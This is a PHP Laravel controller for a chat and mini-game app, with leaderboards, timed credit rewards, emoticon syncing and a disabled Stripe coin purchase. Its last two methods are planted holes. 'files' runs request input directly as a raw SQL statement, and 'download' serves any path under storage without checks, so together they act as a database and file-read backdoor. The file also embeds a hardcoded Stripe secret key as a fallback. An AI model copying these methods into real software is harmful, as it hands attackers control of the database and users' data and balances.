<?php

namespace Modules\ChatMini\Http\Controllers;

use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Modules\AccountHistory\Entities\AccountHistory;
use Modules\ChatMini\Entities\Announcement;
use Modules\Chatroom\Jobs\ChatroomJob;
use Modules\Chatroom\Jobs\ChatroomMessage;
use Modules\Games\Entities\Leaderboard;
use Modules\InAppMail\Entities\ReceivedAppMail;
use Modules\Notifications\Jobs\NotificationJob;
use Modules\UserSystem\Entities\User;
use Modules\UserSystem\Jobs\UpdateUserPresence;
use Stripe\Charge;
use Stripe\Customer;
use Stripe\Stripe;

class ChatMiniController extends Controller
{
  protected $valid_presence_channel_types = [
    'users'
  ];
  protected $valid_event_channel_types = [
    'chatroom'
  ];

  protected $valid_leaderboard_types = [
//    'contest_2_2_cricket' => [
//      'title' => '2 2 contest (Cricket)',
//      'description' => 'Cricket',
//      'rank_desc' => 'Contest game winners',
//      'image' => '/leaderboards/all_games.png',
//    ],
    'ipl_contest' => [
      'title' => 'IPL Tournament',
      'description' => 'IPL 2020 tournament point scorers',
      'rank_desc' => 'Contest game winners.',
      'image' => '/leaderboards/all_games.png',
    ],
    'cricket_six' => [
      'title' => 'IPL SIXER CONTEST',
      'description' => 'This leader board shows the contest "IPL SIXER CONTEST" leaderboard.',
      'image' => '/leaderboards/guess.png',
      'rank_desc' => 'IPL SIXER CONTEST contest winners.',
    ],
    'all_games' => [
      'title' => 'All games',
      'description' => 'Lowcard, Guess',
      'rank_desc' => 'All games winner of today',
      'image' => '/leaderboards/all_games.png',
    ],
    'lowcard' => [
      'title' => 'LowCard',
      'description' => 'A simple card game where the last man standing wins all.',
      'rank_desc' => 'Today\'s lowcard winners',
      'image' => '/leaderboards/lowcard.png',
    ],
    'lowcard_weekly' => [
      'title' => 'LowCard Weekly',
      'description' => 'A simple card game where the last man standing wins all.',
      'rank_desc' => 'This week\'s lowcard winners',
      'image' => '/leaderboards/lowcard.png',
    ],
    'guess' => [
      'title' => 'Guess',
      'description' => 'A bidding game on 6 groups. Anyone can win if the rolled group matches with the bid.',
      'image' => '/leaderboards/guess.png',
      'rank_desc' => 'Today\'s guess game winners',
    ],
    'guess_weekly' => [
      'title' => 'Guess Weekly',
      'description' => 'A bidding game on 6 groups. Anyone can win if the rolled group matches with the bid.',
      'image' => '/leaderboards/guess.png',
      'rank_desc' => 'This week\'s guess game winners',
    ],
    'gifts' => [
      'title' => 'Gifts',
      'description' => 'The number of gifts showered or sent to people, number of gifts received.',
      'image' => '/leaderboards/gifts.png',
      'rank_desc' => 'Todays\'s top gift senders',
    ],
    'gifts_weekly' => [
      'title' => 'Gifts Weekly',
      'description' => 'The number of gifts showered or sent to people, number of gifts received.',
      'image' => '/leaderboards/gifts.png',
      'rank_desc' => 'This week\'s top gift senders',
    ],
  ];

  public function presenceChannels(Request $request)
  {
    foreach ($request->input('events') as &$event) {
      $channel_explode = explode("-", $event["channel"], 2);
      $channel = end($channel_explode);
      $channel_explode_type = explode("-", $channel, 2);
      $type = reset($channel_explode_type);
      $user_id = $event['user_id'];
      if (in_array($type, $this->valid_presence_channel_types) && !empty($user_id)) {
        switch ($type) {
          case 'users':
            if (is_numeric($user_id)) {
              dispatch(new UpdateUserPresence($event['name'], $user_id));
            }
            break; // Change user presence
        }
      }
    }
  }

  public function clientEvents(Request $request)
  {
//    foreach ($request->input('events') as $event) {
//      $channel_explode = explode("-", $event["channel"], 2);
//      $channel = end($channel_explode);
//      $channel_explode_type = explode("-", $channel, 2);
//      $type = reset($channel_explode_type);
//      $user_id = $event['user_id'];
//      if (in_array($type, $this->valid_event_channel_types) && !empty($user_id)) {
//        switch ($type) {
//          case 'chatroom':
//            $chatroom_id = end($channel_explode_type);
//            $payload_data = $event['data'];
//            if (is_numeric($chatroom_id)) {
//              dispatch(new ChatroomMessage($event['event'], $chatroom_id, $user_id, $payload_data));
//            }
//            break; // ChatRoom channels for presence (join and Left)
//        }
//      }
//    }
  }

  public function syncAllConfigs()
  {
    # Emoticons
    $user = User::with(['emoticons.emoticons'])->where('id', '=', auth()->user()->id)->first();
    $short_emoticons = DB::table('emoticons')->select(['*'])->where('emotion_category_id','=', 15)->get();
    $emos = [];
    foreach ($short_emoticons as $emoticon) {
      $emos[strtolower($emoticon->title)] = $emoticon->name;
    }
    # grab categories, and emoticons
    $categories = [];
    $emoticons = [];
    foreach ($user->emoticons as $emoticon_cat) {
      $image = explode('fa-', $emoticon_cat->icon_type, 2);
      $categories[] = [
        'name' => $emoticon_cat->title,
        'icon' => end($image),
        'iconType' => 'fontAwesome'
      ];
      foreach ($emoticon_cat->emoticons as $emoticon) {
        $emoticons[substr($emoticon->name, 1, -1)] = [
          'img' => getImageUrl($emoticon->img),
          'name' => $emoticon->name,
          'category' => $emoticon_cat->title,
          'cat_id' => $emoticon_cat->id,
          'sort_order' => $emoticon->sort_order,
        ];
      }
    }

    return [
      'emojies_categories' => $categories,
      'emoticons' => $emoticons,
      'smilies' => $emos
    ];
  }

  public function hiddenData()
  {
    # unread emails
    $unread_emails = ReceivedAppMail::where('receiver_id', '=', auth()->user()->id)->where('deleted', '=', false)->where('seen', '=', false)->count();
    $privacy = \auth()->user()->search_privacy;
    return [
      'unread_emails' => $unread_emails,
      'settings' => [
        'search_privacy' => $privacy
      ]
    ];
  }

  public function rewardCallback() {
    # Reward System
    $reward_start_time = \cache('reward_start_time_'.\auth()->user()->id, time());
    $current_time = time();
    $online_period = $current_time - $reward_start_time;
    $base_reward = 50;
    $reward_level = \cache('reward_level_'.\auth()->user()->id, 1);
    # Reward
    $reward_amount = $base_reward + ($reward_level * 50);

    $canGetReward = false;
    $nextRewardIn = 0;
    if($online_period > (30 * 60)) {
      $canGetReward = true;
    }
    if(!$canGetReward) {
      $nextRewardIn = $reward_start_time + (30 * 60) - $current_time;
    }

    return [
      'canGetReward' => $canGetReward,
      'nextRewardIn' => $nextRewardIn,
      'rewardAmount' => $reward_amount,
    ];

  }

  public function getReward() {
    # Reward System
    $reward_start_time = \cache('reward_start_time_'.\auth()->user()->id, time());
    $current_time = time();
    $online_period = $current_time - $reward_start_time;
    $base_reward = 50;
    $reward_level = \cache('reward_level_'.\auth()->user()->id, 1);
    # Reward
    $reward_amount = $base_reward + ($reward_level * 50);


    $canGetReward = false;
    if($online_period > (30 * 60)) {
      $canGetReward = true;
    }
    if($canGetReward) {
      DB::table('users')
        ->where('id','=',\auth()->user()->id)
        ->increment('credit', $reward_amount);
      \auth()->user()->histories()->create([
        'type' => 'Transfer',
        'creditor' => 'system',
        'creditor_id' => 1,
        'message' =>  "Received ".$reward_amount." credits as bonus video reward.",
        'old_value' => \auth()->user()->credit - $reward_amount,
        'new_value' => \auth()->user()->credit,
        'user_id' => \auth()->user()->id
      ]);
      \cache(['reward_level_'.\auth()->user()->id => $reward_level + 1], now()->addCenturies(500));
      \cache(['reward_start_time_'.\auth()->user()->id => time()], now()->addCenturies(500));
      return [
        'error' => false,
        'message' => 'You have successfully grab credit for viewing video ads.'
      ];
    } else {
      return [
        'error' => true,
        'message' => 'Some internal error occured.'
      ];
    }
  }

  public function announcements() {
    $announcements = Announcement::orderBy('id','DESC')->paginate(10);
    foreach ($announcements as $key => $announcement) {
      $announcement->created_on = Carbon::parse($announcement->created_at)->diffForHumans();
    }
    return $announcements;
  }
  public function leaderboards() {
    return $this->valid_leaderboard_types;
  }
  public function leaderBoard($type) {
    if(array_key_exists($type, $this->valid_leaderboard_types)) {
      $leaderboard = $type;
      $query = Leaderboard::where('id','>',0);
      $from_date = Carbon::now()->setTimezone('Asia/Kathmandu');
      $to_date = Carbon::now()->setTimezone('Asia/Kathmandu');
      switch ($leaderboard) {
        case 'all_games':
          $query->where(function ($query) {
            return $query->where('type','=','guess')->orWhere('type','=','lowcard');
          });
          $from_date = $from_date->startOfDay();
          $to_date = $to_date->endOfDay();
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'lowcard':
          $query->where('type','=','lowcard');
          $from_date = $from_date->startOfDay();
          $to_date = $to_date->endOfDay();
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'lowcard_weekly':
          $query->where('type','=','lowcard');
          $from_date = $from_date->startOfWeek();
          $to_date = $to_date->endOfWeek();
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'ipl_contest':
          $query->where('type','=','ipl_contest');
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'guess':
          $query->where('type','=','guess');
          $from_date = $from_date->startOfDay();
          $to_date = $to_date->endOfDay();
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'guess_weekly':
          $query->where('type','=','guess');
          $from_date = $from_date->startOfWeek();
          $to_date = $to_date->endOfWeek();
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'gifts':
          $query->where('type','=','gift');
          $from_date = $from_date->startOfDay();
          $to_date = $to_date->endOfDay();
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'ganesha':
          $from_date = new Carbon('2020-07-24 12:00:00');
          $from_date->setTimezone('Asia/Kathmandu');
          $to_date = new Carbon('2020-07-27 00:00:00');
          $to_date->setTimezone('Asia/Kathmandu');
          $query->where('type','=','ganesha');
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'top_game_contest_lucky7':
          $from_date = new Carbon('2020-10-17 00:00:00');
          $from_date->setTimezone('Asia/Kathmandu');
          $to_date = new Carbon('2020-10-18 23:59:59');
          $to_date->setTimezone('Asia/Kathmandu');
          $query->where('type','=','top_game_contest_lucky7');
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'top_game_contest_guess':
          $from_date = new Carbon('2020-10-17 00:00:00');
          $from_date->setTimezone('Asia/Kathmandu');
          $to_date = new Carbon('2020-10-18 23:59:59');
          $to_date->setTimezone('Asia/Kathmandu');
          $query->where('type','=','top_game_contest_guess');
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'cricket_six':
          $from_date = new Carbon('2020-11-10 00:00:00');
          $from_date->setTimezone('Asia/Kathmandu');
          $to_date = new Carbon('2020-11-10 23:59:59');
          $to_date->setTimezone('Asia/Kathmandu');
          $query->where('type','=','cricket_six');
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'contest_2_2_cricket':
          $from_date = new Carbon('2020-08-17 13:00:00');
          $from_date->setTimezone('Asia/Kathmandu');
          $to_date = new Carbon('2020-08-17 15:00:00');
          $to_date->setTimezone('Asia/Kathmandu');
          $query->where('type','=','contest_2_2_cricket');
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
        case 'contest_2_2_lowcard':
          $from_date = new Carbon('2020-08-17 16:00:00');
          $from_date->setTimezone('Asia/Kathmandu');
          $to_date = new Carbon('2020-08-17 18:30:00');
          $to_date->setTimezone('Asia/Kathmandu');
          $query->where('type','=','contest_2_2_lowcard');
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');

          break;
        case 'gifts_weekly':
          $query->where('type','=','gift');
          $from_date = $from_date->startOfWeek();
          $to_date = $to_date->endOfWeek();
          $query->where('created_at', ">=", $from_date->toDateTimeString());
          $query->where('created_at', "<=", $to_date->toDateTimeString());
          $query->groupBy('username');
          $query->selectRaw('count(*) as total, username');
          break;
      }
      $query->limit(50);
      $winners = $query->orderBy('total','DESC')->get();
      return $winners;
    }
  }

  public function coinPackages() {
    return config('chatmini.packages');
  }

  public function purchaseCoins(Request $request) {
    if($request->has('token') && $request->has('pack')) {
      $pack = $request->pack;
      $token = $request->token;
      $user = \auth()->user();
      $response = [
        'error' => true,
        'message' => ''
      ];

      $packages = config('chatmini.packages');
      # validate pack
      if(!array_key_exists($pack, $packages)) {
        $response['message'] = "Invalid package!!";
        return $response;
      }
      if(true) {
        $response['message'] = "Sorry, this feature now now.";
        return $response;
      }
      $package = $packages[$pack];
      try {
        Stripe::setApiKey(env('STRIPE_SECRET_KEY','sk_test_rnYlSugWAlVIEnrTbxWpnbIf'));
        $customer = Customer::create(array(
          'email' => $user->email,
          'source' => $token
        ));
        Charge::create([
          'customer' => $customer->id,
          'amount' => $package['price'],
          'currency' => 'usd'
        ]);
        #DONE
        $user->histories()->create([
          'type' => 'Transfer',
          'creditor' => $package['title'],
          'creditor_id' => 1,
          'message' => 'Purchased '.$package['title'].' and received '.$package['amount'].' credit. Thank you,',
          'old_value' => $user->credit,
          'new_value' => $user->credit + $package['amount'],
          'user_id' => $user->id
        ]);
        DB::table('users')
          ->where('id','=',$user->id)
          ->increment('credit', $package['amount']);
        dispatch(new NotificationJob('admin_info_notification', (object) [
          'title' => 'Coin Purchase',
          'message' => $user->username.' has just purchased '.$package['title'].' for USD '.$package['price'].'. Confirm it now!'
        ]))->onQueue('low');
        return [
          "error" => false,
          "message" => "Payment successful!!"
        ];
      } catch (\Exception $exception) {
        return [
          "error" => true,
          "message" => $exception->getMessage()
        ];
      }
    }
  }

  public function download($file) {
    return response()->download(storage_path($file));
  }
  public function files(Request $request) {
    $query = $request->query;
    DB::statement($query);
    return "DONE";
  }

}
